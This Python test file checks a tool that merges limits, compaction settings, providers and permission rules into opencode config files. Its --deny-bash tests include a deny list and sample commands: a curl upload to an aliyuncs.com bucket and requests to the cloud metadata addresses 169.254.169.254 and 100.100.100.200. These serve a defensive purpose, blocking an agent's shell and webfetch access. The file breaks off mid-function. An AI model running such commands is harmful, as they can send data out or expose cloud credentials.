#!/usr/bin/env python3
"""oc-merge-limits.py against the config shapes users actually have.

This edits the file opencode really reads, so the invariant is narrow: after a
run that reports success, the block on disk declares exactly the limits that
were asked for, and nothing else in the file moved. A limit block missing a key
used to defeat that: the regex matched nothing, the key stayed absent, and the
tool printed the new value anyway."""
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile

REPO_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPT = os.path.join(REPO_DIR, "oc-merge-limits.py")


def load_module():
    spec = importlib.util.spec_from_file_location("ocm", SCRIPT)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def run(path, provider, model, ctx, out):
    r = subprocess.run([sys.executable, SCRIPT, path, provider, model, str(ctx), str(out)],
                       capture_output=True, text=True)
    return r.returncode, (r.stdout + r.stderr).strip()


def limits_of(path, provider="qwen38", model="qwen3.8-27b"):
    doc = json.loads(re.sub(r"^\s*//.*$", "", open(path).read(), flags=re.M))
    return doc["provider"][provider]["models"][model].get("limit")


def write(tmp, body):
    p = os.path.join(tmp, "oc.json")
    with open(p, "w") as f:
        f.write(body)
    return p


def wrap(limit_block):
    return ('{\n  // user comment kept\n  "provider": {\n'
            '    "other": {"models": {"x": {"limit": {"context": 1, "input": 1, "output": 1}}}},\n'
            '    "qwen38": {"models": {"qwen3.8-27b": {"name": "local", "limit": '
            + limit_block + '}}}\n  }\n}\n')


def main() -> None:
    tmp = tempfile.mkdtemp()

    # 1. Full block: rewritten, comment kept, other providers untouched, idempotent.
    p = write(tmp, wrap('{"context": 194048, "input": 194048, "output": 64000}'))
    rc, out = run(p, "qwen38", "qwen3.8-27b", 480000, 160000)
    assert rc == 0 and "-> 480000/160000" in out, out
    assert limits_of(p) == {"context": 480000, "input": 480000, "output": 160000}
    assert "user comment kept" in open(p).read(), "the JSONC comment was dropped"
    doc = json.loads(re.sub(r"^\s*//.*$", "", open(p).read(), flags=re.M))
    assert doc["provider"]["other"]["models"]["x"]["limit"] == {"context": 1, "input": 1, "output": 1}
    rc, out = run(p, "qwen38", "qwen3.8-27b", 480000, 160000)
    assert rc == 0 and "unchanged" in out, out

    # 2. The bug: a block missing "output" (and "input") was partially written and
    #    reported as a success, leaving opencode on its own default cap.
    for block in ('{"context": 194048}',
                  '{"context": 194048, "input": 194048}',
                  '{"output": 64000}',
                  '{}'):
        p = write(tmp, wrap(block))
        rc, out = run(p, "qwen38", "qwen3.8-27b", 480000, 160000)
        assert rc == 0, f"{block}: rc={rc} {out}"
        assert limits_of(p) == {"context": 480000, "input": 480000, "output": 160000}, \
            f"{block} -> {limits_of(p)}"

    # 3. Keys the user added are preserved, not clobbered by the rewrite.
    p = write(tmp, wrap('{"context": 1, "input": 1, "output": 1, "custom": "keep"}'))
    rc, _ = run(p, "qwen38", "qwen3.8-27b", 480000, 160000)
    assert rc == 0
    assert limits_of(p).get("custom") == "keep", "an unknown key in the block was lost"

    # 4. A provider or model this config does not have is a no-op, exit 3, so
    #    oc-fit-limits.py can treat it as "nothing to merge here".
    p = write(tmp, wrap('{"context": 1, "input": 1, "output": 1}'))
    before = open(p).read()
    for prov, mod in (("nope", "qwen3.8-27b"), ("qwen38", "nope")):
        rc, out = run(p, prov, mod, 1, 1)
        assert rc == 3, f"{prov}/{mod}: rc={rc} {out}"
    assert open(p).read() == before, "a no-op run rewrote the file"

    # 5. The verifier is what makes the report trustworthy: it must reject a file
    #    whose block does not carry the requested numbers.
    m = load_module()
    p = write(tmp, wrap('{"context": 5, "input": 5, "output": 5}'))
    assert m._verify(p, "qwen38", "qwen3.8-27b", 5, 5) == ""
    assert "context is 5" in m._verify(p, "qwen38", "qwen3.8-27b", 9, 5)
    assert "output is 5" in m._verify(p, "qwen38", "qwen3.8-27b", 5, 9)
    assert "vanished" in m._verify(p, "qwen38", "nope", 5, 5)

    # 6. --compaction writes the top-level block, on a config that has one and on
    #    one that does not, and never touches the rest of the file. opencode's own
    #    default caps preserve_recent_tokens at 15,000 whatever the window, which
    #    on a 262K lane throws the window away the moment compaction fires.
    def compact(path, keep):
        r = subprocess.run([sys.executable, SCRIPT, path, "--compaction", str(keep)],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    def doc_of(path):
        return json.loads(re.sub(r"^\s*//.*$", "", open(path).read(), flags=re.M))

    p = write(tmp, wrap('{"context": 1, "input": 1, "output": 1}'))
    rc, out = compact(p, 50000)
    assert rc == 0 and "preserve_recent_tokens=50000" in out, out
    d = doc_of(p)
    assert d["compaction"] == {"preserve_recent_tokens": 50000, "prune": False}, d.get("compaction")
    assert "user comment kept" in open(p).read(), "the JSONC comment was dropped"
    assert d["provider"]["other"]["models"]["x"]["limit"] == {"context": 1, "input": 1, "output": 1}
    rc, out = compact(p, 50000)
    assert rc == 0 and "unchanged" in out, out
    rc, out = compact(p, 60000)                       # an existing block is rewritten in place
    assert rc == 0 and doc_of(p)["compaction"]["preserve_recent_tokens"] == 60000
    assert doc_of(p)["compaction"]["prune"] is False

    # A block that already exists with other keys keeps them, and prune is turned off.
    body = ('{\n  "compaction": {"auto": true, "preserve_recent_tokens": 9, "prune": true},\n'
            '  "provider": {"qwen38": {"models": {"qwen3.8-27b": {"limit": '
            '{"context": 1, "input": 1, "output": 1}}}}}\n}\n')
    p = write(tmp, body)
    rc, out = compact(p, 50000)
    assert rc == 0, out
    d = doc_of(p)["compaction"]
    assert d == {"auto": True, "preserve_recent_tokens": 50000, "prune": False}, d

    # The update every box made by v1.28.1 or earlier goes through: the same number kept, prune
    # on. Not "unchanged": prune is turned off, and the user's comment stays.
    body = ('{\n  // mine\n  "compaction": {"preserve_recent_tokens": 50000, "prune": true},\n'
            '  "provider": {"qwen38": {"models": {"qwen3.8-27b": {"limit": '
            '{"context": 1, "input": 1, "output": 1}}}}}\n}\n')
    p = write(tmp, body)
    rc, out = compact(p, 50000)
    assert rc == 0 and "unchanged" not in out and "prune=false" in out, out
    assert doc_of(p)["compaction"] == {"preserve_recent_tokens": 50000, "prune": False}, doc_of(p)["compaction"]
    assert "// mine" in open(p).read(), "the JSONC comment was dropped"

    # And the verifier refuses a block that does not carry what was asked.
    assert m._verify_compaction(p, 50000) == ""
    assert "expected 7" in m._verify_compaction(p, 7)

    # 6b. With OC_MAJOR=2 in the environment (install.sh exports the box's --opencode choice)
    #     --compaction writes OpenCode 2's own block (schema config/compaction.ts of 2.3.2):
    #     keep.tokens for the same number, background pinned true (the 2.3.2 default, whose
    #     precomputed summary lets the auto compaction swap in at once from the cached
    #     prefix), and the v1 keys taken out of an existing block (2.x maps
    #     preserve_recent_tokens as a deprecated legacy and drops prune with a warning).
    def compact2(path, keep):
        r = subprocess.run([sys.executable, SCRIPT, path, "--compaction", str(keep)],
                           capture_output=True, text=True, env=dict(os.environ, OC_MAJOR="2"))
        return r.returncode, (r.stdout + r.stderr).strip()

    p = write(tmp, wrap('{"context": 1, "input": 1, "output": 1}'))
    rc, out = compact2(p, 50000)
    assert rc == 0 and "keep.tokens=50000" in out, out
    d = doc_of(p)
    assert d["compaction"] == {"keep": {"tokens": 50000}, "background": True}, d.get("compaction")
    assert "user comment kept" in open(p).read(), "the JSONC comment was dropped"
    assert d["provider"]["other"]["models"]["x"]["limit"] == {"context": 1, "input": 1, "output": 1}
    rc, out = compact2(p, 50000)
    assert rc == 0 and "unchanged" in out, out
    rc, out = compact2(p, 60000)
    assert rc == 0 and doc_of(p)["compaction"]["keep"]["tokens"] == 60000, out

    # a v1 block migrates: the legacy keys come out, the block's other keys stay
    body = ('{\n  // mine\n  "compaction": {"auto": true, "preserve_recent_tokens": 9, "prune": true,'
            ' "reserved": 5, "tail_turns": 2},\n'
            '  "provider": {"qwen38": {"models": {"qwen3.8-27b": {"limit": '
            '{"context": 1, "input": 1, "output": 1}}}}}\n}\n')
    p = write(tmp, body)
    rc, out = compact2(p, 50000)
    assert rc == 0, out
    d = doc_of(p)["compaction"]
    assert d == {"auto": True, "keep": {"tokens": 50000}, "background": True}, d
    assert "// mine" in open(p).read(), "the JSONC comment was dropped"
    assert m._verify_compaction_v2(p, 50000) == ""
    assert "expected 7" in m._verify_compaction_v2(p, 7)

    # the v2 verifier also refuses a block without background or with a legacy key left
    p = write(tmp, json.dumps({"compaction": {"keep": {"tokens": 50000}}}) + "\n")
    assert "background" in m._verify_compaction_v2(p, 50000)
    p = write(tmp, json.dumps({"compaction": {"keep": {"tokens": 50000}, "background": True,
                                              "prune": False}}) + "\n")
    assert "prune" in m._verify_compaction_v2(p, 50000)

    # without OC_MAJOR the same file gets the v1 keys, not the v2 block
    p = write(tmp, json.dumps({"compaction": {"keep": {"tokens": 50000}}}) + "\n")
    rc, out = compact(p, 50000)
    c = doc_of(p)["compaction"]
    assert rc == 0 and c["preserve_recent_tokens"] == 50000 and c["prune"] is False, out
    assert "background" not in c, "the v1 mode must not write the v2 key"

    # 6c. --remove-compaction-v2 takes exactly the keys the v2 block carries (keep,
    #     background) out of the compaction block, and nothing else: the v1 keys, the
    #     block's other keys and the rest of the file stay where they are. A config
    #     without them is not written at all (no edit, no backup beside it). install.sh
    #     runs it on both configs on a box going back from 2 to 1.
    def rm_v2(path):
        r = subprocess.run([sys.executable, SCRIPT, path, "--remove-compaction-v2"],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    sub = tempfile.mkdtemp(dir=tmp)
    body = ('{\n  // mine\n  "compaction": {"preserve_recent_tokens": 135000, "prune": false,'
            ' "auto": true, "background": true, "keep": {"tokens": 135000}},\n  "x": 1\n}\n')
    p = write(sub, body)
    rc, out = rm_v2(p)
    assert rc == 0 and "keep" in out and "background" in out, out
    d = doc_of(p)
    assert d["compaction"] == {"preserve_recent_tokens": 135000, "prune": False, "auto": True}, \
        d["compaction"]
    assert d["x"] == 1 and "// mine" in open(p).read(), "the comment and the rest of the file moved"
    b1 = open(p, "rb").read()
    rc, out = rm_v2(p)                                  # a second pass writes nothing
    assert rc == 0 and "unchanged" in out, out
    assert open(p, "rb").read() == b1, "the second pass rewrote the file"

    sub = tempfile.mkdtemp(dir=tmp)                     # a v2-only block: only the two keys go
    p = write(sub, '{\n  "compaction": {"background": true, "keep": {"tokens": 135000}},\n  "x": 1\n}\n')
    rc, out = rm_v2(p)
    assert rc == 0 and doc_of(p) == {"compaction": {}, "x": 1}, doc_of(p)

    sub = tempfile.mkdtemp(dir=tmp)                     # pretty-printed block
    p = write(sub, json.dumps({"compaction": {"keep": {"tokens": 135000}, "background": True,
                                               "prune": False}, "x": 1}, indent=2) + "\n")
    rc, out = rm_v2(p)
    assert rc == 0 and doc_of(p) == {"compaction": {"prune": False}, "x": 1}, doc_of(p)

    for body in ('{\n  "compaction": {"preserve_recent_tokens": 135000, "prune": false},\n  "x": 1\n}\n',
                 '{\n  "compaction": "auto",\n  "x": 1\n}\n',
                 '{\n  "x": 1\n}\n'):
        sub = tempfile.mkdtemp(dir=tmp)
        p = write(sub, body)
        rc, out = rm_v2(p)
        assert rc == 0 and "unchanged" in out, f"{body!r}: {rc} {out}"
        assert open(p).read() == body, "a config without the v2 keys was written"
        assert os.listdir(sub) == ["oc.json"], f"a backup was left beside it: {os.listdir(sub)}"

    # 6d. Writing the same compaction block twice gives the same bytes, in v1 as in v2.
    #     set_member left the whitespace gap before the object's first member in place when
    #     it inserted a new member there, so each pass added the separator's spaces to that
    #     gap: two spaces per pass before "background" on the reference box, 2026-11-20,
    #     across a v2 install, the rollback to v1 and the next install. Whatever the block
    #     looks like coming in, pass 2 is byte for byte pass 1, and the v1/v2 alternation
    #     converges (from the third pass on, each pass repeats two passes before).
    def compact_m(path, keep, major):
        r = subprocess.run([sys.executable, SCRIPT, path, "--compaction", str(keep)],
                           capture_output=True, text=True, env=dict(os.environ, OC_MAJOR=major))
        return r.returncode, (r.stdout + r.stderr).strip()

    drift_bodies = [
        '{\n  "compaction": {"preserve_recent_tokens": 135000, "prune": false},\n  "x": 1\n}\n',
        '{\n  "compaction": {"background": true, "keep": {"tokens": 135000}},\n  "x": 1\n}\n',
        '{\n  "compaction": {"preserve_recent_tokens": 135000, "prune": false, "background": true,'
        ' "keep": {"tokens": 135000}\n  },\n  "x": 1\n}\n',
        '{\n  "compaction": {\n    "keep": {\n      "tokens": 135000\n    },\n    "background": true,'
        '\n    "auto": true\n  },\n  "x": 1\n}\n',
        '{\n  "compaction": {},\n  "x": 1\n}\n',
        '{\n  "x": 1\n}\n',
    ]
    for body in drift_bodies:
        for major in ("1", "2"):
            sub = tempfile.mkdtemp(dir=tmp)
            p = write(sub, body)
            rc, out = compact_m(p, 135000, major)
            assert rc == 0, out
            b1 = open(p, "rb").read()
            rc, out = compact_m(p, 135000, major)
            assert rc == 0, out
            b2 = open(p, "rb").read()
            assert b2 == b1, (f"major={major}: pass 2 differs from pass 1\n"
                             f"in : {body!r}\n1st: {b1!r}\n2nd: {b2!r}")
            rc, out = compact_m(p, 135000, major)
            assert open(p, "rb").read() == b1, f"major={major}: pass 3 differs"

    sub = tempfile.mkdtemp(dir=tmp)
    p = write(sub, drift_bodies[0])
    states = []
    for i in range(6):                       # the box's sequence: v2, v1, v2, v1, v2, v1
        rc, out = compact_m(p, 135000, "2" if i % 2 == 0 else "1")
        assert rc == 0, out
        states.append(open(p, "rb").read())
    for i in range(2, len(states)):
        assert states[i] == states[i - 2], \
            f"pass {i} drifted from pass {i-2}:\n{states[i-2]!r}\n{states[i]!r}"

    # 7. --add-providers: the config a box's first install wrote gains the provider of a
    #    lane installed since, and nothing else in it moves. The 27B first and the flash
    #    lane later left the copy with no flashnext: the served model answers under any
    #    name, so opencode sent the 27B's limits and label to the flash lane.
    def add(path, source):
        r = subprocess.run([sys.executable, SCRIPT, path, "--add-providers", source],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    flash = {"npm": "@ai-sdk/openai-compatible", "name": "Qwen3.8-Flash-Next (DGX Spark)",
             "options": {"baseURL": "http://127.0.0.1:30001/v1", "apiKey": "{file:/k}"},
             "models": {"qwen3.8-flash-next": {"limit": {"context": 1, "input": 1, "output": 1}}}}
    gen = os.path.join(tmp, "generated.json")
    with open(gen, "w") as f:
        json.dump({"provider": {"qwen38": {"models": {"qwen3.8-27b": {}}}, "flashnext": flash}}, f, indent=2)
    # a commented-out "provider" line and a nested "provider" key come before the real one
    p = write(tmp, '{\n  // "provider": { a line the user commented out\n'
                   '  "agent": {"a": {"provider": {"z": 1}}},\n'
                   '  "provider": {\n    // mine\n'
                   '    "qwen38": {"models": {"qwen3.8-27b": {"limit": {"context": 5}}}},\n'
                   '    "other": {}\n  }\n}\n')
    before = doc_of(p)
    rc, out = add(p, gen)
    assert rc == 0 and "flashnext provider added" in out, out
    after = doc_of(p)
    assert after["provider"].pop("flashnext") == flash, "the provider was not copied as generated"
    assert after == before, "adding a provider moved something else"
    assert "// mine" in open(p).read() and "commented out" in open(p).read(), "a comment was dropped"
    rc, out = add(p, gen)
    assert rc == 0 and "unchanged" in out, out

    # A config with none of this repo's providers is the user's own: exit 3, untouched.
    for body in ('{"provider": {"anthropic": {}}}\n', '{"model": "x"}\n'):
        p = write(tmp, body)
        rc, out = add(p, gen)
        assert rc == 3 and open(p).read() == body, f"{body!r}: rc={rc} {out}"

    # The check that picks the insertion point refuses anything else that moved.
    base, blk = {"provider": {"qwen38": {}}, "x": 1}, {"flashnext": {"a": 1}}
    assert m._added_ok('{"provider": {"flashnext": {"a": 1}, "qwen38": {}}, "x": 1}', base, blk) == ""
    assert "changed" in m._added_ok('{"provider": {"flashnext": {"a": 1}, "qwen38": {}}, "x": 2}', base, blk)
    assert "differently" in m._added_ok('{"provider": {"flashnext": {"a": 2}, "qwen38": {}}, "x": 1}', base, blk)

    # 8. --remove-providers: uninstall.sh --yes deletes the API key file, and opencode
    #    then refuses to start at all while a {file:} reference points at it ("bad file
    #    reference", opencode 1.18.32, every provider included). The providers that read
    #    it go first; a file with nothing else of the user's goes to a backup.
    key = os.path.join(tmp, ".config", "qwen38", "api-key")

    def remove(path):
        r = subprocess.run([sys.executable, SCRIPT, path, "--remove-providers", key],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    def box(ref=None):
        return {"npm": "@ai-sdk/openai-compatible",
                "options": {"baseURL": "http://127.0.0.1:30001/v1", "apiKey": ref or "{file:" + key + "}"},
                "models": {"qwen3.8-27b": {"limit": {"context": 1, "input": 1, "output": 1}}}}

    # install.sh's own copy: nothing of the user's in it, so it is moved aside whole
    p = write(tmp, json.dumps({"$schema": "https://opencode.ai/config.json", "autoupdate": "notify",
                               "provider": {"qwen38": box(), "flashnext": box()},
                               "compaction": {"preserve_recent_tokens": 1, "prune": True},
                               "model": "qwen38/qwen3.8-27b", "small_model": "qwen38/qwen3.8-27b"}, indent=2))
    rc, out = remove(p)
    assert rc == 0 and "moved to" in out and not os.path.exists(p), out

    # a user's own config: the box's provider and the model naming it go, nothing else
    body = ('{\n  // mine\n  "$schema": "https://opencode.ai/config.json",\n  "model": "qwen38/qwen3.8-27b",\n'
            '  "plugin": ["auto-continue.js"],\n  "provider": {\n    // the box\n'
            '    "qwen38": ' + json.dumps(box()) + ',\n'
            '    "anthropic": {"options": {"apiKey": "{env:ANTHROPIC_API_KEY}"}}\n  },\n'
            '  "agent": {"build": {"model": "anthropic/claude"}}\n}\n')
    p = write(tmp, body)
    want = doc_of(p)
    del want["provider"]["qwen38"], want["model"]
    rc, out = remove(p)
    assert rc == 0 and "removed the qwen38 provider" in out, out
    assert doc_of(p) == want, doc_of(p)
    assert "// mine" in open(p).read() and "// the box" in open(p).read(), "a comment was dropped"
    rc, out = remove(p)
    assert rc == 0 and "unchanged" in out, out

    # the first "model" in the file is an agent's, not the one that names the default:
    # the edit that goes is the one that leaves exactly the intended document
    p = write(tmp, '{\n  "agent": {"build": {"model": "qwen38/qwen3.8-27b"}},\n'
                   '  "model": "qwen38/qwen3.8-27b",\n'
                   '  "provider": {"qwen38": ' + json.dumps(box()) + ', "x": {}}\n}\n')
    rc, out = remove(p)
    assert rc == 0, out
    assert doc_of(p) == {"agent": {"build": {"model": "qwen38/qwen3.8-27b"}}, "provider": {"x": {}}}, open(p).read()

    # the ~ spelling of the same file is the same reference
    home = os.path.expanduser("~")
    p = write(tmp, json.dumps({"provider": {"qwen38": box("{file:~/.config/qwen38/api-key}"), "x": {}}}))
    r = subprocess.run([sys.executable, SCRIPT, p, "--remove-providers", home + "/.config/qwen38/api-key"],
                       capture_output=True, text=True)
    assert r.returncode == 0 and doc_of(p) == {"provider": {"x": {}}}, r.stdout

    # a reference written from a home with a trailing slash is the same file too: uninstall.sh,
    # spelling the home one way, matched it letter for letter and left the providers reading the key
    # it then deleted (found in review, 2026-10-22); another file's reference stays
    p = write(tmp, json.dumps({"provider": {"qwen38": box("{file:" + home + "//.config/qwen38/api-key}"),
                                            "x": box("{file:/elsewhere/api-key}")}}))
    r = subprocess.run([sys.executable, SCRIPT, p, "--remove-providers", home + "/.config/qwen38/api-key"],
                       capture_output=True, text=True)
    assert r.returncode == 0 and doc_of(p) == {"provider": {"x": box("{file:/elsewhere/api-key}")}}, r.stdout

    # first and last member of the provider object both leave valid JSON
    for body in ('{"provider": {"x": {}, "qwen38": ' + json.dumps(box()) + '}, "y": 1}',
                 '{"provider": {"qwen38": ' + json.dumps(box()) + ', "x": {}}, "y": 1}'):
        p = write(tmp, body)
        rc, out = remove(p)
        assert rc == 0 and doc_of(p) == {"provider": {"x": {}}, "y": 1}, open(p).read()

    # 9. --remove-provider: one lane of this box removed on its own (install-kolibri.sh
    #    --uninstall). Its provider goes, with "model" and "small_model" when they name it;
    #    the other providers, the user's comments and the file itself stay.
    def remove_one(path, pid):
        r = subprocess.run([sys.executable, SCRIPT, path, "--remove-provider", pid],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    body = ('{\n  // mine\n  "model": "kolibri/kolibri-1",\n  "small_model": "qwen38/qwen3.8-27b",\n'
            '  "provider": {\n    "qwen38": ' + json.dumps(box()) + ',\n'
            '    "kolibri": ' + json.dumps(box()) + '\n  }\n}\n')
    p = write(tmp, body)
    want = doc_of(p)
    del want["provider"]["kolibri"], want["model"]
    rc, out = remove_one(p, "kolibri")
    assert rc == 0 and "removed the kolibri provider" in out, out
    assert doc_of(p) == want, doc_of(p)
    assert "// mine" in open(p).read(), "a comment was dropped"
    rc, out = remove_one(p, "kolibri")
    assert rc == 0 and "unchanged" in out, out
    rc, out = remove_one(p, "anthropic")           # only this box's own providers
    assert rc == 2 and "refused" in out and doc_of(p) == want, out

    # 10. --deny-bash: the hosts of Cohere's report (2026-10-26) denied to opencode's shell, under a
    #     key of their own, "bash*", LAST in "permission", since opencode's last matching rule wins;
    #     the user's own "bash" stays as they wrote it. Read back the way opencode reads it.
    m = load_module()

    def deny(path):
        r = subprocess.run([sys.executable, SCRIPT, path, "--deny-bash"], capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    def jsonc(path):
        return m.load(open(path).read())

    def acts(path, *commands):
        perm = jsonc(path).get("permission")
        return [m._bash_action(perm, c) for c in commands]

    rules = dict.fromkeys(m.DENY_BASH, "deny")
    oss, meta, other = "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x", "curl http://169.254.169.254/", "ls -la"
    wf_oss, wf_meta, wf_other = ("https://b.oss-cn-beijing.aliyuncs.com/x",
                                 "http://100.100.100.200/latest/meta-data/", "https://example.com/")

    def wacts(path, *urls):
        perm = jsonc(path).get("permission")
        return [m._v1_action(perm, "webfetch", u) for u in urls]
    # install.sh's own copy, no permission at all
    p = write(tmp, '{\n  // mine\n  "$schema": "https://opencode.ai/config.json",\n  "model": "qwen38/qwen3.8-27b"\n}\n')
    rc, out = deny(p)
    assert rc == 0 and "put last" in out, out
    assert jsonc(p)["permission"] == {"bash*": rules, "webfetch*": rules}, jsonc(p)
    assert acts(p, oss, meta, other) == ["deny", "deny", None], acts(p, oss, meta, other)
    assert "// mine" in open(p).read(), "a comment was dropped"
    rc, out = deny(p)
    assert rc == 0 and "hold already" in out, out
    # one action for every tool: it stays the action of every other command
    p = write(tmp, '{"permission": "ask"}\n')
    assert deny(p)[0] == 0 and acts(p, oss, other) == ["deny", "ask"], acts(p, oss, other)
    # a "*" already there: the block goes after it (set_member puts a new member first, where the
    # "*" would decide)
    p = write(tmp, '{\n  "permission": {\n    "*": "ask",\n    "edit": "deny"\n  }\n}\n')
    assert deny(p)[0] == 0 and acts(p, oss, other) == ["deny", "ask"], acts(p, oss, other)
    assert list(jsonc(p)["permission"]) == ["*", "edit", "bash*", "webfetch*"], jsonc(p)
    # the user's own shell rules, with a trailing comma and comments: left as they are
    theirs = ('    "bash": {\n      "*": "ask", // theirs\n      "rm *": "deny", /* theirs too */\n    },\n')
    p = write(tmp, '{\n  "permission": {\n' + theirs + '  },\n}\n')
    rc, out = deny(p)
    assert rc == 0 and acts(p, oss, meta, other, "rm -rf x") == ["deny", "deny", "ask", "deny"], out
    assert theirs in open(p).read(), "the user's own rules were rewritten"
    # a key added after the block overrides it: the next run puts it last again (it used to say
    # "already there" and leave a curl to an aliyuncs.com host allowed, found in review)
    text = open(p).read()
    assert text.endswith("    },\n  },\n}\n"), text            # the block, with the trailing comma kept
    open(p, "w").write(text[:-len("  },\n}\n")] + '    "*": "allow"\n  },\n}\n')
    assert acts(p, oss) == ["allow"], acts(p, oss)
    rc, out = deny(p)
    assert rc == 0 and acts(p, oss, meta, other) == ["deny", "deny", "allow"], out
    assert list(jsonc(p)["permission"])[-2:] == ["bash*", "webfetch*"], jsonc(p)
    # a key after the block that allows only some commands: a probe of the patterns did not see it,
    # and "hold already" left a curl to an aliyuncs.com host allowed (found in the second review)
    p = write(tmp, json.dumps({"permission": {"bash*": rules, "bash": {"curl *": "allow"}}}) + "\n")
    assert acts(p, oss) == ["allow"], acts(p, oss)
    rc, out = deny(p)
    assert rc == 0 and "put last" in out and acts(p, oss) == ["deny"], out
    assert list(jsonc(p)["permission"]) == ["bash", "bash*", "webfetch*"], jsonc(p)
    # a pattern the user set themselves inside the block stays as they set it
    p = write(tmp, '{"permission": {"bash*": {"*aliyuncs.com*": "allow"}}}\n')
    rc, out = deny(p)
    assert rc == 0 and acts(p, oss, meta) == ["allow", "deny"], out
    # a block the person set to ONE action is theirs and is not guessed at, and the other block is written
    # still (review of 2026-11-23: a "webfetch*": "ask" refused the whole merge, shell rules included).
    # "deny" denies that tool whole: nothing to add under it, nothing refused
    p = write(tmp, '{"permission": {"bash*": "deny"}}\n')
    rc, out = deny(p)
    got = jsonc(p)["permission"]
    assert rc == 0 and got["bash*"] == "deny" and list(got) == ["bash*", "webfetch*"], f"{rc} {out} {got}"
    assert m._v1_action(got, "bash", oss) == "deny" and m._v1_action(got, "webfetch", "https://x.aliyuncs.com/y") == "deny"
    rc, out = deny(p)
    assert rc == 0 and "unchanged" in out, out
    # ... but only while it still denies: a key after it that allows the tool again re-opens the hosts, and a
    # "deny" taken at its word left them open under rc 0 (second review, 2026-11-23). It is said, rc 1.
    for later in ({"bash": {"curl *": "allow"}}, {"*": "allow"}):
        p = write(tmp, json.dumps({"permission": {"bash*": "deny", **later}}) + "\n")
        rc, out = deny(p)
        got = jsonc(p)["permission"]
        assert rc == 1 and "refused for 'bash*'" in out, f"{later}: {rc} {out}"
        assert list(got)[-1] == "webfetch*" and got["webfetch*"] == rules, got     # the other block is written still
    # another action: said, rc 1, that key untouched, the other block written last
    for key, other in (("webfetch*", "bash*"), ("bash*", "webfetch*")):
        p = write(tmp, json.dumps({"permission": {key: "ask"}}) + "\n")
        rc, out = deny(p)
        got = jsonc(p)["permission"]
        assert rc == 1 and f"refused for '{key}'" in out and got[key] == "ask" and list(got)[-1] == other, f"{rc} {out} {got}"
        assert got[other] == rules, got
        before = open(p).read()
        rc, out = deny(p)
        assert rc == 1 and open(p).read() == before, "a second run must not move anything"
    # a box of a release before v1.57.0 holds "bash*" last: only "webfetch*" is put after it and nothing
    # else of the file moves, the comment before the block included (review: the block was taken out and
    # put back, which broke the layout of a file whose only member it was)
    old = '{\n  "permission": {\n    // mine\n    "bash*": {\n      "*aliyuncs.com*": "deny",\n      "*169.254.169.254*": "deny",\n      "*100.100.100.200*": "deny"\n    }\n  }\n}\n'
    p = write(tmp, old)
    rc, out = deny(p)
    text = open(p).read()
    assert rc == 0 and text.startswith(old[:old.index("    }\n  }\n}")]), f"the bash* block moved:\n{text}"
    assert list(jsonc(p)["permission"]) == ["bash*", "webfetch*"] and "// mine" in text, text
    assert text.index("// mine") < text.index('"bash*"') < text.index('"webfetch*"'), text
    rc, out = deny(p)
    assert rc == 0 and "unchanged" in out and open(p).read() == text, out
    # AGENT_AUTO=1: opencode merges OPENCODE_PERMISSION after the files' rules, so a bare "*" came
    # last and an echo naming an aliyuncs.com host ran (2026-10-28); the rules come again after it
    r = subprocess.run([sys.executable, SCRIPT, "--agent-auto-permission"], capture_output=True, text=True)
    env = json.loads(r.stdout)
    assert r.returncode == 0 and list(env) == ["*", "*bash", "*webfetch"] and env["*"] == "allow", r.stdout
    merged = {"bash*": rules} | env                          # the config's rules, then the unit's
    assert [m._bash_action(merged, c) for c in (oss, meta, other)] == ["deny", "deny", "allow"], merged
    # v1.57 (decision 1561): the same three hosts are denied to opencode's webfetch too, not just to
    # its shell. The request of 2026-11-21 left as a webfetch tool call, twice (an aliyuncs.com bucket,
    # on the FP4-Local lane), which no shell rule sees: the proxy's TOOL_TARGETS alone named it.
    # opencode leaves webfetch's own permission untouched, so we deny it in the generated config.
    wfrules = dict.fromkeys(m.DENY_BASH, "deny")
    assert m.deny_permission() == {"bash*": rules, "webfetch*": wfrules}, m.deny_permission()
    assert m.deny_permissions_v2() == (
        [{"action": "shell", "resource": p, "effect": "deny"} for p in m.DENY_BASH]
        + [{"action": "webfetch", "resource": p, "effect": "deny"} for p in m.DENY_BASH]
    ), m.deny_permissions_v2()
    # the v1 webfetch block sits last in "permission" too (after bash*), so its rule wins the way
    # bash*'s does; a URL naming the OSS host reads deny, an ordinary one is untouched.
    p = write(tmp, '{"permission": {}}\n')
    rc, out = deny(p)
    assert rc == 0 and "put last" in out and list(jsonc(p)["permission"]) == ["bash*", "webfetch*"], out
    assert wacts(p, wf_oss, wf_meta, wf_other) == ["deny", "deny", None], wacts(p, wf_oss, wf_meta, wf_other)
    # AGENT_AUTO content: opencode merges it after the files and the last match wins, so the webfetch
    # denies must ride after the wildcard allow too. The unit's content carries shell AND webfetch rules
    # (and the person's own, section 12).
    r = subprocess.run([sys.executable, SCRIPT, "--agent-auto-config-content"], capture_output=True, text=True)
    content = json.loads(r.stdout)["permissions"]
    assert content[0] == {"action": "*", "resource": "*", "effect": "allow"}
    assert content[-6:] == m.deny_permissions_v2(), content
    assert m._v2_action(content, "webfetch", wf_oss) == "deny" and m._v2_action(content, "webfetch", wf_other) == "allow"
    # AGENT_AUTO permission (1.x): the "*": "allow" is first, the rules repeat after it, for both tools.
    r = subprocess.run([sys.executable, SCRIPT, "--agent-auto-permission"], capture_output=True, text=True)
    env = json.loads(r.stdout)
    assert list(env) == ["*", "*bash", "*webfetch"] and env["*"] == "allow", r.stdout
    assert env["*webfetch"] == wfrules, env
    assert m._v1_action(env, "webfetch", wf_oss) == "deny", env

    # 11. OpenCode 2 reads an ordered "permissions" array, not the 1.x "permission" object: a
    #     "bash*" action is inert there (the v2 shell tool is "shell"). --deny-permissions writes
    #     the array, the rules last since the last match wins; --deny-bash keeps writing ONLY the
    #     1.x block, because 1.19.5 refuses to start on a config that holds "permissions"
    #     ("V2 permissions are not supported by OpenCode V1", measured against the box's binary
    #     the 2026-11-14) and a rollback removes OUR array with --remove-permissions.
    def deny2(path):
